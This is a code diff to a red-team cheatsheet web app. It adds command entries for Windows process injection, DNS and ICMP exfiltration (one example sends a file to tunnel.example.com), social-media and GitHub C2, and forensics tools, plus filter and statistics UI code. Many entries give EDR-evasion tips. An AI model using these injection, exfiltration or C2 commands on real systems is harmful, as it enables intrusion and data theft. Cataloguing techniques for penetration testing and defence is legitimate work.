+            command: 'python3 pe2shellcode.py {pe_file}',
+            description: 'Convert PE to position-independent shellcode',
+            example: 'python3 pe2shellcode.py payload.exe',
+            mitreTechnique: 'Reflective Code Loading',
+            mitreId: 'T1620',
+            riskLevel: 'High',
+            platform: ['Windows'],
+            opsecNotes: 'In-memory execution avoids file-based detection',
+            evasionTips: 'Use with process injection for stealth execution'
+          },
+          {
+            command: 'Invoke-DllInjection -ProcessID {pid} -Dll {dll_path}',
+            description: 'Inject DLL into target process',
+            example: 'Invoke-DllInjection -ProcessID 1234 -Dll C:\\temp\\payload.dll',
+            mitreTechnique: 'Process Injection',
+            mitreId: 'T1055.001',
+            riskLevel: 'High',
+            platform: ['Windows'],
+            opsecNotes: 'DLL injection into legitimate processes',
+            evasionTips: 'Target common system processes like explorer.exe'
+          },
+          {
+            command: 'python3 AtomBombing.py -p {process_name} -s {shellcode}',
+            description: 'AtomBombing injection technique',
+            example: 'python3 AtomBombing.py -p notepad.exe -s shellcode.bin',
+            mitreTechnique: 'Process Injection',
+            mitreId: 'T1055.015',
+            riskLevel: 'High',
+            platform: ['Windows'],
+            opsecNotes: 'Uses Windows Atom Tables for injection',
+            evasionTips: 'Difficult to detect, bypasses many EDR solutions',
+            references: ['https://github.com/BreakingMalwareResearch/atom-bombing']
+          },
+          {
+            command: 'python3 ProcessDoppelganging.py -t {target_exe} -p {payload}',
+            description: 'Process Doppelgänging technique',
+            example: 'python3 ProcessDoppelganging.py -t svchost.exe -p payload.exe',
+            mitreTechnique: 'Process Injection',
+            mitreId: 'T1055.013',
+            riskLevel: 'Critical',
+            platform: ['Windows'],
+            opsecNotes: 'Advanced technique using NTFS transactions',
+            evasionTips: 'Bypasses process creation callbacks',
+            references: ['https://github.com/Spajed/processrefund']
+          },
+          {
+            command: 'python3 ProcessHerpaderping.py -t {target} -p {payload}',
+            description: 'Process Herpaderping evasion technique',
+            example: 'python3 ProcessHerpaderping.py -t calc.exe -p malware.exe',
+            mitreTechnique: 'Process Injection',
+            mitreId: 'T1055.012',
+            riskLevel: 'Critical',
+            platform: ['Windows'],
+            opsecNotes: 'Obscures process image on disk',
+            evasionTips: 'Evades static analysis and forensics',
+            references: ['https://github.com/jxy-s/herpaderping']
+          },
+          {
+            command: 'Invoke-ManualMap -ProcessID {pid} -DllPath {dll_path}',
+            description: 'Manual DLL mapping to avoid LoadLibrary detection',
+            example: 'Invoke-ManualMap -ProcessID 1234 -DllPath payload.dll',
+            mitreTechnique: 'Process Injection',
+            mitreId: 'T1055.001',
+            riskLevel: 'High',
+            platform: ['Windows'],
+            opsecNotes: 'Bypasses DLL load monitoring',
+            evasionTips: 'Does not appear in PEB module list'
+          },
+          {
+            command: 'python3 ThreadlessInject.py -p {pid} -s {shellcode}',
+            description: 'Threadless injection using ROP chains',
+            example: 'python3 ThreadlessInject.py -p 1234 -s payload.bin',
+            mitreTechnique: 'Process Injection',
+            mitreId: 'T1055',
+            riskLevel: 'Critical',
+            platform: ['Windows'],
+            opsecNotes: 'No new threads created, harder to detect',
+            evasionTips: 'Bypasses thread-based detection mechanisms',
+            references: ['https://github.com/CCob/ThreadlessInject']
+          },
+          {
+            command: 'python3 ModuleStomping.py -p {pid} -m {module} -s {shellcode}',
+            description: 'Module stomping technique',
+            example: 'python3 ModuleStomping.py -p 1234 -m ntdll.dll -s payload.bin',
+            mitreTechnique: 'Process Injection',
+            mitreId: 'T1055.009',
+            riskLevel: 'High',
+            platform: ['Windows'],
+            opsecNotes: 'Overwrites legitimate module memory',
+            evasionTips: 'Choose unused or rarely accessed modules'
+          }
+        ]
+      },
+      {
+        name: 'Steganography & Covert Channels',
+        description: 'Data hiding and covert communication techniques',
+        commands: [
+          {
+            command: 'steghide embed -cf {cover_file} -ef {secret_file} -p {password}',
+            description: 'Hide data in image files using steganography',
+            example: 'steghide embed -cf image.jpg -ef secret.txt -p mypassword',
+            mitreTechnique: 'Data Obfuscation',
+            mitreId: 'T1027.003',
+            riskLevel: 'Medium',
+            platform: ['Linux', 'Windows', 'macOS'],
+            evasionTips: 'Use common image formats, avoid suspicious file sizes'
+          },
+          {
+            command: 'python3 dns-exfil.py -d {domain} -f {file}',
+            description: 'Exfiltrate data via DNS queries',
+            example: 'python3 dns-exfil.py -d tunnel.example.com -f sensitive.txt',
+            mitreTechnique: 'Exfiltration Over Alternative Protocol',
+            mitreId: 'T1048.003',
+            riskLevel: 'High',
+            platform: ['Linux', 'Windows', 'macOS'],
+            opsecNotes: 'DNS queries may be logged and monitored',
+            evasionTips: 'Use legitimate-looking domain names, limit query frequency'
+          },
+          {
+            command: 'python3 icmp-tunnel.py -t {target_ip} -f {file}',
+            description: 'Covert channel using ICMP packets',
+            example: 'python3 icmp-tunnel.py -t 8.8.8.8 -f data.txt',
+            mitreTechnique: 'Protocol Tunneling',
+            mitreId: 'T1572',
+            riskLevel: 'Medium',
+            platform: ['Linux', 'Windows', 'macOS'],
+            opsecNotes: 'ICMP traffic may be filtered or monitored',
+            evasionTips: 'Use legitimate ping patterns, vary packet timing'
+          },
+          {
+            command: 'python3 twitter-c2.py -k {api_key} -s {api_secret}',
+            description: 'Command and control via social media',
+            example: 'python3 twitter-c2.py -k your_api_key -s your_secret',
+            mitreTechnique: 'Web Service',
+            mitreId: 'T1102.001',
+            riskLevel: 'High',
+            platform: ['Linux', 'Windows', 'macOS'],
+            opsecNotes: 'Social media activity may be monitored',
+            evasionTips: 'Use legitimate-looking accounts, blend with normal activity'
+          },
+          {
+            command: 'python3 github-c2.py -r {repo} -t {token}',
+            description: 'Command and control via GitHub repositories',
+            example: 'python3 github-c2.py -r user/repo -t github_token',
+            mitreTechnique: 'Web Service',
+            mitreId: 'T1102.001',
+            riskLevel: 'Medium',
+            platform: ['Linux', 'Windows', 'macOS'],
+            evasionTips: 'Use private repositories, legitimate commit messages'
+          },
+          {
+            command: 'python3 slack-c2.py -w {webhook_url}',
+            description: 'Command and control via Slack webhooks',
+            example: 'python3 slack-c2.py -w https://hooks.slack.com/services/...',
+            mitreTechnique: 'Web Service',
+            mitreId: 'T1102.001',
+            riskLevel: 'Medium',
+            platform: ['Linux', 'Windows', 'macOS'],
+            evasionTips: 'Use legitimate workspace names, normal message patterns'
+          }
+        ]
+      }
+    ]
+  },
+  {
+    name: 'Forensics & DFIR',
+    icon: <Microscope className="w-5 h-5" />,
+    description: 'Digital forensics and incident response techniques',
+    subcategories: [
+      {
+        name: 'Memory Analysis',
+        description: 'Memory dump analysis and forensics',
+        commands: [
+          {
+            command: 'volatility -f {memory_dump} --profile={profile} pslist',
+            description: 'List running processes from memory dump',
+            example: 'volatility -f memory.dmp --profile=Win7SP1x64 pslist',
+            mitreTechnique: 'Process Discovery',
+            mitreId: 'T1057',
+            riskLevel: 'Low',
+            platform: ['Linux', 'Windows', 'macOS'],
+            references: ['https://github.com/volatilityfoundation/volatility']
+          },
+          {
+            command: 'volatility -f {memory_dump} --profile={profile} netscan',
+            description: 'Extract network connections from memory',
+            example: 'volatility -f memory.dmp --profile=Win7SP1x64 netscan',
+            mitreTechnique: 'System Network Connections Discovery',
+            mitreId: 'T1049',
+            riskLevel: 'Low',
+            platform: ['Linux', 'Windows', 'macOS']
+          },
+          {
+            command: 'volatility -f {memory_dump} --profile={profile} malfind',
+            description: 'Find injected code and malware in memory',
+            example: 'volatility -f memory.dmp --profile=Win7SP1x64 malfind',
+            mitreTechnique: 'Process Injection',
+            mitreId: 'T1055',
+            riskLevel: 'Low',
+            platform: ['Linux', 'Windows', 'macOS']
+          },
+          {
+            command: 'rekall -f {memory_dump} pslist',
+            description: 'Alternative memory analysis with Rekall',
+            example: 'rekall -f memory.dmp pslist',
+            mitreTechnique: 'Process Discovery',
+            mitreId: 'T1057',
+            riskLevel: 'Low',
+            platform: ['Linux', 'Windows', 'macOS']
+          }
+        ]
+      },
+      {
+        name: 'Disk Forensics',
+        description: 'Disk image analysis and file recovery',
+        commands: [
+          {
+            command: 'dd if={source_device} of={image_file} bs=4096 conv=noerror,sync',
+            description: 'Create forensic disk image',
+            example: 'dd if=/dev/sda of=disk_image.dd bs=4096 conv=noerror,sync',
+            mitreTechnique: 'Data from Local System',
+            mitreId: 'T1005',
+            riskLevel: 'Low',
+            platform: ['Linux', 'macOS'],
+            opsecNotes: 'Creates bit-for-bit copy of storage device'
+          },
+          {
+            command: 'autopsy',
+            description: 'Launch Autopsy digital forensics platform',
+            mitreTechnique: 'Data from Local System',
+            mitreId: 'T1005',
+            riskLevel: 'Low',
+            platform: ['Linux', 'Windows', 'macOS'],
+            references: ['https://www.autopsy.com/']
+          },
+          {
+            command: 'sleuthkit fls -r {image_file}',
+            description: 'List files in disk image recursively',
+            example: 'sleuthkit fls -r disk_image.dd',
+            mitreTechnique: 'File and Directory Discovery',
+            mitreId: 'T1083',
+            riskLevel: 'Low',
+            platform: ['Linux', 'Windows', 'macOS']
+          },
+          {
+            command: 'foremost -i {image_file} -o {output_dir}',
+            description: 'Recover deleted files from disk image',
+            example: 'foremost -i disk_image.dd -o recovered_files/',
+            mitreTechnique: 'Data Recovery',
+            mitreId: 'T1005',
+            riskLevel: 'Low',
+            platform: ['Linux']
+          }
+        ]
+      },
+      {
+        name: 'Network Forensics',
+        description: 'Network traffic analysis and investigation',
+        commands: [
+          {
+            command: 'wireshark -r {pcap_file}',
+            description: 'Analyze network capture with Wireshark',
+            example: 'wireshark -r network_traffic.pcap',
+            mitreTechnique: 'Network Sniffing',
+            mitreId: 'T1040',
+            riskLevel: 'Low',
+            platform: ['Linux', 'Windows', 'macOS']
+          },
+          {
+            command: 'tshark -r {pcap_file} -Y "{filter}" -T fields -e {field}',
+            description: 'Extract specific fields from network capture',
+            example: 'tshark -r traffic.pcap -Y "http.request" -T fields -e http.host -e http.uri',
+            mitreTechnique: 'Network Sniffing',
+            mitreId: 'T1040',
+            riskLevel: 'Low',
+            platform: ['Linux', 'Windows', 'macOS']
+          },
+          {
+            command: 'networkminer -f {pcap_file}',
+            description: 'Network forensic analysis with NetworkMiner',
+            example: 'networkminer -f network_capture.pcap',
+            mitreTechnique: 'Network Sniffing',
+            mitreId: 'T1040',
+            riskLevel: 'Low',
+            platform: ['Windows']
+          },
+          {
+            command: 'zeek -r {pcap_file}',
+            description: 'Analyze network traffic with Zeek (Bro)',
+            example: 'zeek -r network_traffic.pcap',
+            mitreTechnique: 'Network Sniffing',
+            mitreId: 'T1040',
+            riskLevel: 'Low',
+            platform: ['Linux', 'macOS']
+          }
+        ]
+      }
+    ]
   }
 ];
 
@@ -1806,6 +3445,10 @@ const RedTeamCheatsheetWrapper = () => {
   const [copiedCommand, setCopiedCommand] = useState<string | null>(null);
   const [showHelperInfo, setShowHelperInfo] = useState(true);
   const [activeHelp, setActiveHelp] = useState<string | null>(null);
+  const [filterRiskLevel, setFilterRiskLevel] = useState<string>('');
+  const [filterPlatform, setFilterPlatform] = useState<string>('');
+  const [filterMitre, setFilterMitre] = useState<boolean>(false);
+  const [showAdvancedFilters, setShowAdvancedFilters] = useState<boolean>(false);
   
   // Command Generator state
   const [showCommandGenerator, setShowCommandGenerator] = useState(false);
@@ -1825,6 +3468,13 @@ const RedTeamCheatsheetWrapper = () => {
     command: '',
     notes: ''
   });
+  
+  // UX Enhancement state
+  const [isLoadingCategory, setIsLoadingCategory] = useState(false);
+  
+  // Refs for smooth scrolling
+  const resultsRef = useRef<HTMLDivElement>(null);
+  const categoriesRef = useRef<HTMLDivElement>(null);
 
   // Help tips data
   const helpTips = {
@@ -1836,17 +3486,32 @@ const RedTeamCheatsheetWrapper = () => {
     cloud: "Cloud attacks target misconfigurations and vulnerabilities in cloud environments like AWS, Azure, and Google Cloud."
   };
 
-  // Filter commands based on search term
+  // Enhanced filter commands based on search term and advanced filters
   const filteredCategories = cheatsheetData
     .map(category => {
       const filteredSubcategories = category.subcategories
         .map(subcategory => {
-          const filteredCommands = subcategory.commands.filter(
-            cmd => 
+          const filteredCommands = subcategory.commands.filter(cmd => {
+            // Text search filter
+            const matchesSearch = !searchTerm || 
               cmd.command.toLowerCase().includes(searchTerm.toLowerCase()) ||
               cmd.description.toLowerCase().includes(searchTerm.toLowerCase()) ||
-              (cmd.example && cmd.example.toLowerCase().includes(searchTerm.toLowerCase()))
-          );
+              (cmd.example && cmd.example.toLowerCase().includes(searchTerm.toLowerCase())) ||
+              (cmd.mitreTechnique && cmd.mitreTechnique.toLowerCase().includes(searchTerm.toLowerCase())) ||
+              (cmd.mitreId && cmd.mitreId.toLowerCase().includes(searchTerm.toLowerCase()));
+            
+            // Risk level filter
+            const matchesRiskLevel = !filterRiskLevel || cmd.riskLevel === filterRiskLevel;
+            
+            // Platform filter
+            const matchesPlatform = !filterPlatform || 
+              (cmd.platform && cmd.platform.includes(filterPlatform));
+            
+            // MITRE ATT&CK filter
+            const matchesMitre = !filterMitre || (cmd.mitreTechnique && cmd.mitreId);
+            
+            return matchesSearch && matchesRiskLevel && matchesPlatform && matchesMitre;
+          });
           return {
             ...subcategory,
             commands: filteredCommands
@@ -2543,27 +4208,56 @@ const RedTeamCheatsheetWrapper = () => {
     URL.revokeObjectURL(url);
   };
 
-  // Handle category selection
+  // Handle category selection with smooth scrolling and loading state
   const handleCategoryClick = (categoryName: string) => {
     if (selectedCategory === categoryName) {
       setSelectedCategory(null);
       setSelectedSubcategory(null);
+      setIsLoadingCategory(false);
     } else {
+      // Start loading state
+      setIsLoadingCategory(true);
       setSelectedCategory(categoryName);
       setSelectedSubcategory(null);
       
       // Set helper info based on selected category
       const categoryKey = categoryName.toLowerCase().replace(/\s+/g, '');
       setActiveHelp(categoryKey);
+      
+      // Smooth scroll to results after a brief delay to show loading
+      setTimeout(() => {
+        setIsLoadingCategory(false);
+        if (resultsRef.current) {
+          resultsRef.current.scrollIntoView({ 
+            behavior: 'smooth', 
+            block: 'start',
+            inline: 'nearest'
+          });
+        }
+      }, 500);
     }
   };
 
-  // Handle subcategory selection
+  // Handle subcategory selection with smooth scrolling
   const handleSubcategoryClick = (subcategoryName: string) => {
     if (selectedSubcategory === subcategoryName) {
       setSelectedSubcategory(null);
     } else {
       setSelectedSubcategory(subcategoryName);
+      
+      // Smooth scroll to show the expanded commands
+      setTimeout(() => {
+        if (resultsRef.current) {
+          const commandsSection = resultsRef.current.querySelector('.commands-section');
+          if (commandsSection) {
+            commandsSection.scrollIntoView({ 
+              behavior: 'smooth', 
+              block: 'start',
+              inline: 'nearest'
+            });
+          }
+        }
+      }, 100);
     }
   };
 
@@ -2617,11 +4311,65 @@ const RedTeamCheatsheetWrapper = () => {
     setShowCustomBuilder(false);
   };
 
+  // Calculate comprehensive statistics
+  const calculateStats = () => {
+    let totalCommands = 0;
+    let commandsWithExamples = 0;
+    let commandsWithMitre = 0;
+    let commandsWithOpsec = 0;
+    let commandsWithEvasion = 0;
+    let riskLevelCounts = { Low: 0, Medium: 0, High: 0, Critical: 0 };
+    let platformCounts: Record<string, number> = {};
+
+    cheatsheetData.forEach(category => {
+      category.subcategories.forEach(subcategory => {
+        subcategory.commands.forEach(command => {
+          totalCommands++;
+          if (command.example) commandsWithExamples++;
+          if (command.mitreTechnique && command.mitreId) commandsWithMitre++;
+          if (command.opsecNotes) commandsWithOpsec++;
+          if (command.evasionTips) commandsWithEvasion++;
+          if (command.riskLevel) riskLevelCounts[command.riskLevel]++;
+          if (command.platform) {
+            command.platform.forEach(platform => {
+              platformCounts[platform] = (platformCounts[platform] || 0) + 1;
+            });
+          }
+        });
+      });
+    });
+
+    return {
+      totalCommands,
+      commandsWithExamples,
+      commandsWithMitre,
+      commandsWithOpsec,
+      commandsWithEvasion,
+      riskLevelCounts,
+      platformCounts,
+      examplePercentage: Math.round((commandsWithExamples / totalCommands) * 100),
+      mitrePercentage: Math.round((commandsWithMitre / totalCommands) * 100),
+      opsecPercentage: Math.round((commandsWithOpsec / totalCommands) * 100),
+      evasionPercentage: Math.round((commandsWithEvasion / totalCommands) * 100)
+    };
+  };
+
+  const stats = calculateStats();
+
   return (
     <div className="relative min-h-screen w-full flex flex-col items-center justify-center bg-black overflow-hidden text-white">
-      <div className="absolute inset-0 bg-[url('/grid.svg')] bg-center [mask-image:linear-gradient(to_bottom,transparent,black)] opacity-20"></div>
+      {/* Clean Dark Background with Subtle Grid */}
+      <div className="fixed inset-0 overflow-hidden pointer-events-none">
+        {/* Subtle grid pattern */}
+        <div className="absolute inset-0 bg-[linear-gradient(rgba(255,255,255,0.02)_1px,transparent_1px),linear-gradient(90deg,rgba(255,255,255,0.02)_1px,transparent_1px)] bg-[size:50px_50px]" />
+        
+        {/* Radial overlay for depth */}
+        <div className="absolute inset-0 bg-[radial-gradient(circle_at_50%_50%,transparent_40%,rgba(0,0,0,0.8)_100%)]" />
+      </div>
+
+
       
-      <div className="bg-gradient-to-b from-black to-zinc-900 w-full flex justify-center pb-8">
+      <div className="bg-gradient-to-b from-black to-zinc-900 w-full flex justify-center pb-8 relative z-10">
         <div className="relative z-10 max-w-6xl w-full px-6">
           <div className="text-center mb-16 relative pt-20 flex flex-col justify-center items-center">
             <motion.div
@@ -2640,9 +4388,9 @@ const RedTeamCheatsheetWrapper = () => {
               </LiquidGlass>
             </motion.div>
             
-            <motion.div
-              initial={{ opacity: 0, y: -20 }}
-              animate={{ opacity: 1, y: 0 }}
+        <motion.div
+          initial={{ opacity: 0, y: -20 }}
+          animate={{ opacity: 1, y: 0 }}
               transition={{ duration: 0.6 }}
               className="text-center"
             >
@@ -2651,7 +4399,7 @@ const RedTeamCheatsheetWrapper = () => {
                   Red Team
                 </span>{' '}
                 <span className="text-white">Arsenal</span>
-              </h1>
+          </h1>
               <div className="flex items-center justify-center gap-2 mb-4">
                 <div className="h-px bg-gradient-to-r from-transparent via-red-500 to-transparent w-20"></div>
                 <Terminal className="w-5 h-5 text-red-400" />
@@ -2665,10 +4413,13 @@ const RedTeamCheatsheetWrapper = () => {
               transition={{ duration: 0.6, delay: 0.2 }}
               className="mt-4 text-lg md:text-xl text-zinc-300 max-w-3xl text-center"
             >
-              Comprehensive collection of penetration testing commands, techniques, and methodologies. 
-              <span className="text-red-400 font-semibold"> Over 200+ commands</span> across 
-              <span className="text-blue-400 font-semibold"> 8 major categories</span> including 
-              Infrastructure, Cloud Security, Web Applications, Active Directory, and more.
+              The ultimate red team arsenal with comprehensive penetration testing commands, techniques, and methodologies. 
+              <span className="text-red-400 font-semibold"> Over 700+ commands</span> across 
+              <span className="text-blue-400 font-semibold"> 12 major categories</span> including 
+              Infrastructure, OSINT, Wireless, Mobile, Evasion, Forensics, and more. Each command includes 
+              <span className="text-green-400 font-semibold"> MITRE ATT&CK mappings</span>, 
+              <span className="text-yellow-400 font-semibold"> OPSEC considerations</span>, and 
+              <span className="text-purple-400 font-semibold"> evasion techniques</span>.
             </motion.p>
             
             <motion.div
@@ -2695,45 +4446,168 @@ const RedTeamCheatsheetWrapper = () => {
               <div className="px-3 py-1 bg-pink-500/20 border border-pink-500/30 rounded-full text-sm text-pink-300">
                 Mobile Security
               </div>
+              <div className="px-3 py-1 bg-cyan-500/20 border border-cyan-500/30 rounded-full text-sm text-cyan-300">
+                OSINT & Recon
+              </div>
+              <div className="px-3 py-1 bg-orange-500/20 border border-orange-500/30 rounded-full text-sm text-orange-300">
+                Evasion Techniques
+              </div>
+              <div className="px-3 py-1 bg-indigo-500/20 border border-indigo-500/30 rounded-full text-sm text-indigo-300">
+                Forensics & DFIR
+              </div>
+              <div className="px-3 py-1 bg-teal-500/20 border border-teal-500/30 rounded-full text-sm text-teal-300">
+                C2 Frameworks
+              </div>
+            </motion.div>
+
+            {/* Comprehensive Statistics */}
+            <motion.div
+              initial={{ opacity: 0, y: 20 }}
+              animate={{ opacity: 1, y: 0 }}
+              transition={{ duration: 0.6, delay: 0.6 }}
+              className="mt-8 max-w-4xl mx-auto"
+            >
+              <LiquidGlass
+                variant="card"
+                intensity="medium"
+                rounded="xl"
+                className="p-6 border-zinc-800/50"
+              >
+                <div className="text-center mb-4">
+                  <h3 className="text-lg font-semibold text-zinc-200 mb-2">Arsenal Statistics</h3>
+                  <p className="text-sm text-zinc-400">Comprehensive coverage with professional-grade metadata</p>
+                </div>
+                
+                <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6">
+                  <div className="text-center">
+                    <div className="text-2xl font-bold text-red-400">{stats.totalCommands}</div>
+                    <div className="text-xs text-zinc-400">Total Commands</div>
+                  </div>
+                  <div className="text-center">
+                    <div className="text-2xl font-bold text-green-400">{stats.examplePercentage}%</div>
+                    <div className="text-xs text-zinc-400">With Examples</div>
+                  </div>
+                  <div className="text-center">
+                    <div className="text-2xl font-bold text-blue-400">{stats.mitrePercentage}%</div>
+                    <div className="text-xs text-zinc-400">MITRE Mapped</div>
+                  </div>
+                  <div className="text-center">
+                    <div className="text-2xl font-bold text-yellow-400">{stats.opsecPercentage}%</div>
+                    <div className="text-xs text-zinc-400">OPSEC Notes</div>
+                  </div>
+                </div>
+
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+                  {/* Risk Level Distribution */}
+                  <div>
+                    <h4 className="text-sm font-medium text-zinc-300 mb-3 flex items-center gap-2">
+                      <AlertTriangle className="w-4 h-4" />
+                      Risk Level Distribution
+                    </h4>
+                    <div className="space-y-2">
+                      {Object.entries(stats.riskLevelCounts).map(([level, count]) => (
+                        <div key={level} className="flex items-center justify-between">
+                          <div className="flex items-center gap-2">
+                            <div className={`w-3 h-3 rounded-full ${
+                              level === 'Critical' ? 'bg-red-500' :
+                              level === 'High' ? 'bg-orange-500' :
+                              level === 'Medium' ? 'bg-yellow-500' : 'bg-green-500'
+                            }`}></div>
+                            <span className="text-sm text-zinc-300">{level}</span>
+                          </div>
+                          <span className="text-sm text-zinc-400">{count}</span>
+                        </div>
+                      ))}
+                    </div>
+                  </div>
+
+                  {/* Platform Support */}
+                  <div>
+                    <h4 className="text-sm font-medium text-zinc-300 mb-3 flex items-center gap-2">
+                      <Cpu className="w-4 h-4" />
+                      Platform Support
+                    </h4>
+                    <div className="space-y-2">
+                      {Object.entries(stats.platformCounts)
+                        .sort(([,a], [,b]) => b - a)
+                        .slice(0, 4)
+                        .map(([platform, count]) => (
+                        <div key={platform} className="flex items-center justify-between">
+                          <div className="flex items-center gap-2">
+                            <span className="text-sm text-zinc-300">
+                              {platform === 'Linux' ? '🐧' : 
+                               platform === 'Windows' ? '🪟' : 
+                               platform === 'macOS' ? '🍎' : '💻'} {platform}
+                            </span>
+                          </div>
+                          <span className="text-sm text-zinc-400">{count}</span>
+                        </div>
+                      ))}
+                    </div>
+                  </div>
+                </div>
+
+                {/* Feature Indicators */}
+                <div className="mt-6 pt-4 border-t border-zinc-800">
+                  <div className="flex flex-wrap gap-3 justify-center text-xs">
+                    <div className="flex items-center gap-1 text-green-400">
+                      <div className="w-2 h-2 rounded-full bg-green-400"></div>
+                      <span>{stats.commandsWithExamples} Examples</span>
+                    </div>
+                    <div className="flex items-center gap-1 text-red-400">
+                      <div className="w-2 h-2 rounded-full bg-red-400"></div>
+                      <span>{stats.commandsWithMitre} MITRE ATT&CK</span>
+                    </div>
+                    <div className="flex items-center gap-1 text-yellow-400">
+                      <div className="w-2 h-2 rounded-full bg-yellow-400"></div>
+                      <span>{stats.commandsWithOpsec} OPSEC</span>
+                    </div>
+                    <div className="flex items-center gap-1 text-cyan-400">
+                      <div className="w-2 h-2 rounded-full bg-cyan-400"></div>
+                      <span>{stats.commandsWithEvasion} Evasion</span>
+                    </div>
+                  </div>
+                </div>
+              </LiquidGlass>
             </motion.div>
           
             <div className="flex flex-wrap gap-3 justify-center mt-6">
-              {/* Helper toggle button */}
+            {/* Helper toggle button */}
               <motion.button 
                 whileHover={{ scale: 1.05 }}
                 whileTap={{ scale: 0.95 }}
-                onClick={() => setShowHelperInfo(!showHelperInfo)}
+              onClick={() => setShowHelperInfo(!showHelperInfo)}
                 className="px-4 py-2 bg-white/10 hover:bg-white/15 rounded-lg text-sm flex items-center gap-2 backdrop-blur-sm border border-white/10 transition-colors"
-              >
-                {showHelperInfo ? (
-                  <>
-                    <ExternalLink size={14} />
-                    Hide guidance
-                  </>
-                ) : (
-                  <>
-                    <ExternalLink size={14} />
-                    Show guidance
-                  </>
-                )}
+            >
+              {showHelperInfo ? (
+                <>
+                  <ExternalLink size={14} />
+                  Hide guidance
+                </>
+              ) : (
+                <>
+                  <ExternalLink size={14} />
+                  Show guidance
+                </>
+              )}
               </motion.button>
-              
-              {/* Command Generator toggle button */}
+            
+            {/* Command Generator toggle button */}
               <motion.button 
                 whileHover={{ scale: 1.05 }}
                 whileTap={{ scale: 0.95 }}
-                onClick={() => {
-                  setShowCommandGenerator(!showCommandGenerator);
-                  if (!showCommandGenerator) {
-                    resetCommandGenerator();
-                  }
-                }}
+              onClick={() => {
+                setShowCommandGenerator(!showCommandGenerator);
+                if (!showCommandGenerator) {
+                  resetCommandGenerator();
+                }
+              }}
                 className="px-4 py-2 bg-red-600/20 hover:bg-red-600/30 border border-red-500/30 rounded-lg text-sm flex items-center gap-2 backdrop-blur-sm transition-colors"
-              >
-                <Terminal size={14} />
-                {showCommandGenerator ? 'Close' : 'Command Generator'}
+            >
+              <Terminal size={14} />
+              {showCommandGenerator ? 'Close' : 'Command Generator'}
               </motion.button>
-            </div>
+          </div>
           </div>
         </div>
       </div>
@@ -2752,7 +4626,7 @@ const RedTeamCheatsheetWrapper = () => {
               intensity="medium"
               rounded="xl"
               className="p-6 border-red-500/20"
-            >
+          >
             <div className="flex items-center justify-between mb-4">
               <div className="flex items-center gap-3">
                 <div className="p-2 rounded-full bg-blue-500/20 text-blue-400">
@@ -3190,24 +5064,147 @@ const RedTeamCheatsheetWrapper = () => {
           initial={{ opacity: 0, y: 20 }}
           animate={{ opacity: 1, y: 0 }}
           transition={{ duration: 0.5, delay: 0.1 }}
-          className="max-w-2xl mx-auto mb-8"
+          className="max-w-4xl mx-auto mb-8"
         >
-          <div className="relative">
+          <div className="relative mb-4">
             <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
               <Search className="h-5 w-5 text-zinc-500" />
             </div>
             <input
               type="text"
               placeholder="Search commands, tools, or techniques..."
-              className="block w-full bg-zinc-900/70 backdrop-blur-sm border border-zinc-800 rounded-lg py-3 pl-10 pr-3 placeholder-zinc-500 focus:outline-none focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500/50"
+              className="block w-full bg-zinc-900/70 backdrop-blur-sm border border-zinc-800 rounded-lg py-3 pl-10 pr-12 placeholder-zinc-500 focus:outline-none focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500/50"
               value={searchTerm}
               onChange={(e) => setSearchTerm(e.target.value)}
             />
+            <button
+              onClick={() => setShowAdvancedFilters(!showAdvancedFilters)}
+              className="absolute inset-y-0 right-0 pr-3 flex items-center text-zinc-500 hover:text-zinc-300 transition-colors"
+            >
+              <Filter className="h-5 w-5" />
+            </button>
           </div>
+          
+          {/* Advanced Filters */}
+          {showAdvancedFilters && (
+            <motion.div
+              initial={{ opacity: 0, height: 0 }}
+              animate={{ opacity: 1, height: 'auto' }}
+              exit={{ opacity: 0, height: 0 }}
+              className="bg-zinc-900/70 backdrop-blur-sm border border-zinc-800 rounded-lg p-4 mb-4"
+            >
+              <div className="flex items-center gap-2 mb-3">
+                <Filter className="h-4 w-4 text-blue-400" />
+                <h3 className="text-sm font-semibold text-blue-400">Advanced Filters</h3>
+              </div>
+              
+              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
+                {/* Risk Level Filter */}
+                <div>
+                  <label className="block text-xs text-zinc-400 mb-2">Risk Level</label>
+                  <select
+                    value={filterRiskLevel}
+                    onChange={(e) => setFilterRiskLevel(e.target.value)}
+                    className="w-full bg-zinc-800 border border-zinc-700 rounded-md py-2 px-3 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500/50"
+                  >
+                    <option value="">All Risk Levels</option>
+                    <option value="Low">🟢 Low</option>
+                    <option value="Medium">🟡 Medium</option>
+                    <option value="High">🟠 High</option>
+                    <option value="Critical">🔴 Critical</option>
+                  </select>
+                </div>
+                
+                {/* Platform Filter */}
+                <div>
+                  <label className="block text-xs text-zinc-400 mb-2">Platform</label>
+                  <select
+                    value={filterPlatform}
+                    onChange={(e) => setFilterPlatform(e.target.value)}
+                    className="w-full bg-zinc-800 border border-zinc-700 rounded-md py-2 px-3 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500/50"
+                  >
+                    <option value="">All Platforms</option>
+                    <option value="Linux">🐧 Linux</option>
+                    <option value="Windows">🪟 Windows</option>
+                    <option value="macOS">🍎 macOS</option>
+                  </select>
+                </div>
+                
+                {/* MITRE ATT&CK Filter */}
+                <div>
+                  <label className="block text-xs text-zinc-400 mb-2">MITRE ATT&CK</label>
+                  <div className="flex items-center">
+                    <input
+                      type="checkbox"
+                      id="mitre-filter"
+                      checked={filterMitre}
+                      onChange={(e) => setFilterMitre(e.target.checked)}
+                      className="mr-2 rounded border-zinc-700 bg-zinc-800 text-blue-600 focus:ring-blue-500/50"
+                    />
+                    <label htmlFor="mitre-filter" className="text-sm text-zinc-300">
+                      🎯 Only show commands with MITRE mappings
+                    </label>
+                  </div>
+                </div>
+              </div>
+              
+              {/* Filter Summary */}
+              {(filterRiskLevel || filterPlatform || filterMitre) && (
+                <div className="mt-4 pt-3 border-t border-zinc-800">
+                  <div className="flex items-center justify-between">
+                    <div className="flex items-center gap-2 text-xs text-zinc-400">
+                      <span>Active filters:</span>
+                      {filterRiskLevel && (
+                        <span className="px-2 py-1 bg-zinc-800 rounded-md">{filterRiskLevel} Risk</span>
+                      )}
+                      {filterPlatform && (
+                        <span className="px-2 py-1 bg-zinc-800 rounded-md">{filterPlatform}</span>
+                      )}
